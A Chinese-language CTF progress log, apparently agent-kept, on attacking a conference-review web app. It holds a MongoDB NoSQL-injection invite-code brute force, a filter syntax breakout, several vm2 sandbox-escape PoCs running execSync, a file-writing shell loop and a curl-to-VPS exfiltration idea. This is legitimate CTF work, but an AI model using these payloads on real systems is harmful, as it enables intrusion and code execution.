# AAA26 Big-1 利用进展记录

目标：

- `http://web-71fd555c46.adworld.xctf.org.cn:80/`

当前状态：

- MongoDB NoSQL 注入链已打通。
- 已拿到 reviewer 身份。
- reviewer 动态过滤接口可访问。
- vm2 RCE 尚未确认成功。
- `/flag` 尚未读取到。

## 1. 本地信息

起始本地目录只有一个说明文件：

- `AGENTS.md`

说明里给出的预期利用链是：

1. 注册普通用户。
2. 利用 reviewer profile 的 service-desk MongoDB NoSQL 注入爆破 reviewer 邀请码。
3. claim reviewer 身份。
4. 利用 reviewer dynamic filter 里的 vm2 沙箱逃逸。
5. 读取 `/flag`。

## 2. 已注册账号

已注册普通用户：

- 用户名：`unxmvtd7aok`
- 密码：`Passw0rd!`
- 邮箱：`unxmvtd7aok@example.com`

claim 成功后，该账号的 JWT 角色变为 `reviewer`。

## 3. Reviewer 邀请码 NoSQL 注入

确认的接口：

- `POST /reviewer/profile`
- 上传 JSON 的 multipart 字段名：`profileFile`

确认的表单字段：

- `track`
- `areas`
- `score`
- `statement`
- `profileFile`

可用的恶意 JSON 结构：

```json
{
  "committee": {
    "registration": {
      "reference": {
        "$regex": "^PREFIX"
      }
    }
  }
}
```

每次测试前缀的流程：

1. `POST /reviewer/profile`
2. `POST /reviewer/profile/submit`
3. `POST /reviewer/profile/service-sync`

命中时回显：

```text
Committee service desk has an available assignment slot.
```

未命中时回显：

```text
Committee service desk has not found an assignment slot yet.
```

已爆破出的 reviewer 邀请码：

```text
90ffe021a10c15819dd2bbf73ab12411fb65
```

claim 信息：

- 邮箱：`committee-shadow@aaa26.big1`
- 邀请码：`90ffe021a10c15819dd2bbf73ab12411fb65`

claim 接口：

- `POST /reviewer/claim`

claim 成功响应：

- `302 /reviewer/assignments?claimed=1`

## 4. 已确认的 Reviewer 接口

Reviewer 页面：

- `GET /reviewer/assignments`
- `GET /reviewer/search`
- `POST /reviewer/search`
- `POST /api/reviewer/filter`

`/reviewer/search` 的表单字段：

- `expression`

`/api/reviewer/filter` 同时接受 form 和 JSON：

```http
POST /api/reviewer/filter
Content-Type: application/json

{"expression":"true"}
```

响应结构：

```json
{
  "ok": true,
  "count": 12,
  "results": []
}
```

可作为布尔侧信道：

- 表达式 `true` 返回 `count: 12`
- 表达式 `false` 返回 `count: 0`
- 抛异常或被过滤时通常返回 `ok:false,count:0`

vm2 表达式里可见变量：

- `paper`
- `review`
- `reviewer`
- `scores`

基础指纹测试结果：

- `typeof process !== 'undefined'` -> false
- `typeof require !== 'undefined'` -> false
- `typeof global !== 'undefined'` -> true
- `typeof Buffer !== 'undefined'` -> true
- `typeof WebAssembly !== 'undefined'` -> true
- `typeof WebAssembly.JSTag !== 'undefined'` -> false
- `typeof DisposableStack !== 'undefined'` -> true
- `typeof AsyncDisposableStack !== 'undefined'` -> true

## 5. 一个重要的源码拼接细节

动态过滤器大概率把用户输入拼成类似：

```js
Boolean((() => (${expression}))())
```

但表达式可以逃出这个包裹：

```js
0))()); true //
```

实测结果：

- `0))()); false //` -> `count: 0`
- `0))()); true //` -> `count: 12`
- `0))()); 0 //` -> `count: 0`
- `0))()); 1 //` -> `count: 12`

这对某些 PoC 很重要，因为有些 vm2 漏洞需要控制 `vm.run()` 的顶层返回值，而不是只在 `Boolean(...)` 内部执行表达式。

## 6. 已测试的 vm2 CVE / PoC

用户给过的 gist：

- `https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9`

关键点：

- Promise species 逃逸里，`async fn()` 内部需要递归触发 `Error().stack` 栈溢出，制造 host-side 异常。
- 单纯 `throw new Error()` 不等价。

### Promise Species 类 PoC

测试过 AGENTS.md 里的版本，也测试过 gist 里的递归栈溢出版本。

代表性 payload：

```js
(()=>{
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => {
                    return err.constructor.constructor('return process')()
                        .mainModule.require('child_process')
                        .execSync('sleep 2');
                }
            )
        }
    }
};
p.then();
return true;
})()
```

观察结果：

- `sleep 1` 和 `sleep 3` 的响应时间都约为 `1.28s`，没有随 sleep 时间变化。
- 未确认命令执行。
- 常见返回是 `ok:false,count:0`。

也测试过 GitHub advisory 中 `CVE-2026-24120` 的 `Object.defineProperty=()=>{}` 变体，未确认命令执行。

### CVE-2026-44008

参考：

- `https://github.com/advisories/GHSA-9qj6-qjgg-37qq`

概要：

- 通过 `neutralizeArraySpeciesBatch()` 逃逸。
- 影响 `<=3.11.1`。
- `3.11.2` 修复。

测试过 PoC 结构：

```js
(()=>{
  const a = [];
  Object.defineProperty(Array.prototype, 0, {
    set(value) {
      a.f = Buffer.prototype.inspect;
      value.arr.f.constructor.constructor("return process")()
        .mainModule.require('child_process')
        .execSync('sleep 2');
    }
  });
  new Buffer(a);
  return true;
})()
```

也测试过利用源码拼接逃逸后的顶层形式：

```js
0))());
const a = [];
Object.defineProperty(Array.prototype, 0, {
  set(value) {
    a.f = Buffer.prototype.inspect;
    value.arr.f.constructor.constructor("return process")()
      .mainModule.require('child_process')
      .execSync('sleep 2');
  }
});
new Buffer(a) //
```

观察结果：

- 没有 `sleep` 延迟。
- 在 setter 内设置命中标志也没有触发。
- 当前目标上该 PoC 没有表现出可利用迹象。

### CVE-2026-44009

参考：

- `https://github.com/advisories/GHSA-9vg3-4rfj-wgcm`

概要：

- null-proto exception 逃逸。
- 影响 `<=3.11.1`。
- `3.11.2` 修复。

测试结构：

```js
(()=>{
  const o = {__proto__: null};
  try {
    throw o;
  } catch (e) {
    e.f = Buffer.prototype.inspect;
    o.f.constructor("return process")()
      .mainModule.require('child_process')
      .execSync('sleep 2');
  }
  return true;
})()
```

观察结果：

- 没有确认命令执行。
- 相关属性赋值能发生，但没有拿到 host `process`。

### CVE-2026-26332 / SuppressedError

参考：

- `https://github.com/advisories/GHSA-55hx-c926-fr95`

测试过官方 PoC 改写版：

```js
(()=>{
const ds = new DisposableStack();
ds.defer(() => { throw null; });
ds.defer(() => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  ds.dispose();
} catch(e) {
  const Function = e.suppressed.constructor.constructor;
  const process = new Function('return process;')();
  process.mainModule.require('child_process').execSync('sleep 2');
}
return true;
})()
```

观察结果：

- `DisposableStack` 存在。
- 但预期的 `e.suppressed` 路径不可用。
- 没有确认命令执行。

### CVE-2026-26956 / WASM Sandbox Escape

参考：

- `https://github.com/advisories/GHSA-ffh4-j6h5-pg66`

该漏洞大概率不适用：

- 需要 `WebAssembly.JSTag`。
- 目标上 `typeof WebAssembly.JSTag !== 'undefined'` 返回 false。

### CVE-2026-24781 / Inspect Function

参考：

- `https://github.com/advisories/GHSA-v37h-5mfm-c47c`

测试过官方 PoC 结构：

```js
(()=>{
const obj = {
  subarray: Buffer.prototype.inspect,
  slice: Buffer.prototype.slice,
  hexSlice:()=> '',
  l:{__proto__: null}
};
obj.slice(20, {
  showHidden: true,
  showProxy: true,
  depth: 10,
  stylize(a) {
    if (this.seen?.[1]?.objectWrapper) this.seen[1].objectWrapper().x = obj.slice;
    return a;
  }
});
obj.l.x.constructor('return process')()
  .mainModule.require('child_process')
  .execSync('sleep 2');
return true;
})()
```

观察结果：

- 没有确认命令执行。

### CVE-2026-43997 和 CVE-2026-44006

参考：

- `https://github.com/advisories/GHSA-47x8-96vw-5wg6`
- `https://github.com/advisories/GHSA-qcp4-v2jj-fjx8`

测试过 WebAssembly / inspect 相关 PoC。

观察结果：

- 没有确认命令执行。

### CVE-2026-44003 / Internal State

参考：

- `https://github.com/advisories/GHSA-wp5r-2gw5-m7q7`

测试：

```js
typeof VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL !== 'undefined'
```

观察结果：

- 返回 `ok:false,count:0`。
- 当前上下文不可访问该内部变量。

## 7. RCE 外带 / 回显尝试

尝试过写入常见静态目录：

```sh
for d in ./public ../public /app/public /usr/src/app/public /home/node/app/public /var/www/html/public; do
  if [ -d $d ]; then echo owned > $d/NAME.txt; fi
done
```

随后访问：

- `/public/NAME.txt`
- `/NAME.txt`

观察结果：

- 返回的是应用自己的 HTML 404 页面，不是写入的文件。
- 由于同一批 payload 的 `sleep` 侧信道也失败，更像是 RCE 没发生，而不是单纯静态目录不可访问。

## 8. 其它应用面观察

论文提交：

- `GET /papers/new`
- `POST /papers/new`
- multipart 文件字段：`pdf`

论文查看：

- `/papers/:id/view`
- 现有论文 PDF 链接为 `/public/sample.pdf`

Review 编辑：

- `GET /reviewer/papers/:id/review`
- `POST /reviewer/papers/:id/review`
- 字段：`score`、`confidence`、`recommendation`、`comments`

这些方向还没有深入利用。

## 9. 当前困境

现在卡住的点主要在 vm2 逃逸，而不是前置权限链。

### 已经确定的部分

- NoSQL 注入爆破邀请码是稳定可复现的。
- reviewer 身份已经拿到。
- `/api/reviewer/filter` 能稳定执行表达式。
- filter 有布尔侧信道，可用 `count:12/count:0` 判断表达式真假。
- filter 的源码拼接存在可利用的语法逃逸点：`0))()); ... //`。

### 卡住的部分

公开 PoC 暂时都没有打出 RCE。

目前测试过的公开 vm2 漏洞覆盖了：

- Promise species 类逃逸。
- `CVE-2026-44008`。
- `CVE-2026-44009`。
- `CVE-2026-26332`。
- `CVE-2026-26956`。
- `CVE-2026-24781`。
- `CVE-2026-43997`。
- `CVE-2026-44006`。
- `CVE-2026-44003`。

它们都没有产生可确认的命令执行效果。

### 可能原因

1. 目标实际 vm2 版本可能已经是 `3.11.2` 或等价修复版。

   `CVE-2026-44008` 和 `CVE-2026-44009` 都是影响 `<=3.11.1`、修复于 `3.11.2` 的漏洞。如果目标确实装的是 `3.11.2`，这两条就不该成功。

2. `AGENTS.md` 里写的是 `"vm2": "^3.11.2"`。

   如果部署时正常 npm install，`^3.11.2` 会安装 `3.11.2` 或更高兼容版本，而不是漏洞描述里常见的 `<=3.11.1`。这和“预期可打公开 3.11 漏洞”之间存在矛盾。

3. 部分 CVE 依赖特定 Node/V8 特性。

   例如 `CVE-2026-26956` 需要 `WebAssembly.JSTag`，但目标里这个对象不存在。

4. filter 的结果被转成布尔值。

   常规命令输出无法直接回显。即便拿到 RCE，也需要外带、写文件、时间侧信道，或把 `/flag` 内容转换成布尔判断逐位读。

5. 外带通道还不确定。

   AGENTS.md 推荐 `curl http://YOUR-VPS/...`，但目前没有确认目标容器能出网。写文件到静态目录的尝试也没有看到可访问文件。

6. 没有源码。

   现在只能通过远程 HTTP 行为猜测实现细节，无法确认：

   - vm2 精确版本。
   - Node 精确版本。
   - `VM` 初始化参数。
   - 是否禁用了某些能力。
   - 是否有额外 patch 或包装逻辑。

### 当前判断

权限链本身是完整的，但 RCE 阶段的公开 PoC 与目标实际环境不匹配。

目标有两种可能：

1. 题目预期的 vm2 漏洞不是目前已测试的这些公开 PoC，需要继续找更贴合 `3.11.2` 或该环境的逃逸。
2. RCE 不是唯一后续路径，拿到 reviewer 后还存在其它应用层漏洞，例如 PDF 上传、静态文件、review comments、隐藏管理接口等。

## 10. 后续建议方向

优先继续做这些：

1. 继续查是否存在适用于 `vm2 3.11.2` 的公开逃逸。
2. 找源码泄露或 sourcemap、静态文件暴露，确认真实依赖版本。
3. 深挖 reviewer 后的应用层功能：
   - PDF 上传是否存在路径穿越或类型绕过。
   - `/public/sample.pdf` 的静态文件处理是否可控。
   - review comments 是否有模板注入、存储型 XSS 或服务端渲染问题。
   - 是否存在隐藏 chair/admin 路由。
4. 如果最终能确认 RCE，再选择可行的数据回收方式：
   - 时间侧信道逐位读 `/flag`。
   - DNS/HTTP 外带。
   - 写入可访问静态目录。

